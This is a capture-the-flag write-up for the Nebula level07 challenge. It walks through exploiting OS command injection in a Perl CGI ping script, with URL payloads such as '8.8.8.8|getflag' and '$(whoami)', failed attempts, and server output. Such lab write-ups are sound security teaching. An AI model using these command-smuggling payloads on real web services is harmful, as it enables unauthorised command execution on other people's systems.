# For level07 in nebula

>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
>  
>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.

We are given the source code of the following perl program and given the hint that this is related toa web server. (Before I solved this challenge, I had *no* idea that perl cgi was a server side script for web servers).
```
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

On first glance, it is obvious that the program is vulnerable to [OS command injection](https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)). 

The program simply takes whatever value is given as an argument to `param("Host")` and chucks it into `ping -c 3 $host 2>&1` without any input sanitation whatsoever.



Let's explore what files are present in `/home/flag07`. They might come in handy.
```
level07@nebula:/home/flag07$ ls -la
total 10
drwxr-x--- 2 flag07 level07  102 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     300 2012-08-27 07:18 ..
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3353 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
```
There are 2 files of particular interest to us, `index.cgi` and `thttpd.conf`. As [man pages show](https://linux.die.net/man/8/thttpd), thttpd is a simple, small, fast, and secure HTTP server. So `thttpd.conf` is its configuration file. Let's see what useful information it contains.

```
level07@nebula:/home/flag07$ cat thttpd.conf 
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007

[...]
# Specifies what user to switch to after initialization when started as root.
user=flag07

```

The config file specifies that the server runs as `user=flag07`, and listens at `port=7007`. At the time of doing this challenge, the Nebula VM was on IP address 192.168.1.20. So, we will connect to it through the URL `http://192.168.1.20:7007/index.cgi`.


Let's get started.
#### Intended Usage

Input: `http://192.168.1.20:7007/index.cgi/?Host=8.8.8.8`

Output : 
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_req=1 ttl=53 time=3.26 ms
64 bytes from 8.8.8.8: icmp_req=2 ttl=53 time=3.50 ms
64 bytes from 8.8.8.8: icmp_req=3 ttl=53 time=3.82 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2012ms
rtt min/avg/max/mdev = 3.269/3.530/3.820/0.235 ms
```

#### Unintended Usage

Input: `http://192.168.1.20:7007/index.cgi/?Host=$(whoami)`

Output: `ping: unknown host flag07`

`ping -c 3 $host 2>&1` -> `ping -c 3 $(whoami) 2>&1` -> `ping -c 3 flag07 2>&1`. `flag07` is not a valid host to ping, so an error was returned by `ping`.

But this output proves 2 facts.
1. The program *really is* vulnerable to OS command injection.
2. The program is executed as `flag07`, so if we inject the command `getlfag`, it'll be run as `flag07`. It's the perfect plan.


#### Winning

Input: `http://192.168.1.20:7007/index.cgi/?Host=8.8.8.8|getflag`

Output: `You have successfully executed getflag on a target account`



#### Troubles with command injection

I did not successfully exploit the OS command injection vulnerability on the first go. I *knew* there is such a vulnerability. It just took me several tries to get correctly exploit the weakness.

**Failed 1**  
Input: `http://192.168.1.20:7007/index.cgi/?Host=8.8.8.8|$(ls)`

Output: `sh: index.cgi: command not found`

`ping -c 3 $host 2>&1` -> `ping -c 3 8.8.8.8|$(ls) 2>&1` -> `ping -c 3 8.8.8.8 | index.cgi 2>&1` 
There is no output from `ping` to stdout as it was piped into the non-existant "command" `index.cgi`. So all we see is the shell complain that there is no such command.

**Failed 2**  
Input1: `http://192.168.1.20:7007/index.cgi/?Host=\`ls\``
Input2: `http://192.168.1.20:7007/index.cgi/?Host=$(ls)`

Output: `ping: unknown host index.cgi`

`ping -c 3 $host 2>&1` -> `ping -c 3 $(ls) 2>&1` -> `ping -c 3 index.cgi 2>&1`. `index.cgi` is not a valid host to ping, so an error was returned by `ping`.

**Failed 3**
Input: `http://192.168.1.20:7007/index.cgi/?Host=8.8.8.8;$(ls)`

Output: 
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_req=1 ttl=53 time=3.49 ms
64 bytes from 8.8.8.8: icmp_req=2 ttl=53 time=3.48 ms
64 bytes from 8.8.8.8: icmp_req=3 ttl=53 time=3.31 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2011ms
rtt min/avg/max/mdev = 3.314/3.432/3.496/0.083 ms
```

**Failed 3**  
Input (in the website): `http://192.168.1.20:7007/index.cgi/?Host=192.168.1.20;ls`

Output (in the website): 
```
PING 192.168.1.20 (192.168.1.20) 56(84) bytes of data.
64 bytes from 192.168.1.20: icmp_req=1 ttl=64 time=0.028 ms
64 bytes from 192.168.1.20: icmp_req=2 ttl=64 time=0.078 ms
64 bytes from 192.168.1.20: icmp_req=3 ttl=64 time=0.077 ms

--- 192.168.1.20 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.028/0.061/0.078/0.023 ms
```

Honestly, I have no idea why the output of `ls` was not included. Because when I ran the command in the command line, the output of `ls` was included in stdout.

```
level07@nebula:/home/flag07$ ping -c 3 8.8.8.8; ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.

[...]
index.cgi  thttpd.conf
```

Only when I changed `;` to `|` was I given the expected output in the webpage.

**Passed 1**  
Input: http://192.168.1.20:7007/index.cgi/?Host=8.8.8.8|ls

Output: 
```
index.cgi
thttpd.conf
```

This is the correct output of the injected command `ls`. `ls` does not accept inputs from stdin, so it does not matter that any output was piped to it. Also, `thttpd.conf` shows that the server is run with `/home/flag07` as its directory. That's why `ls` shows us these 2 files present in `/home/flag07`.

```
# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07
```


END
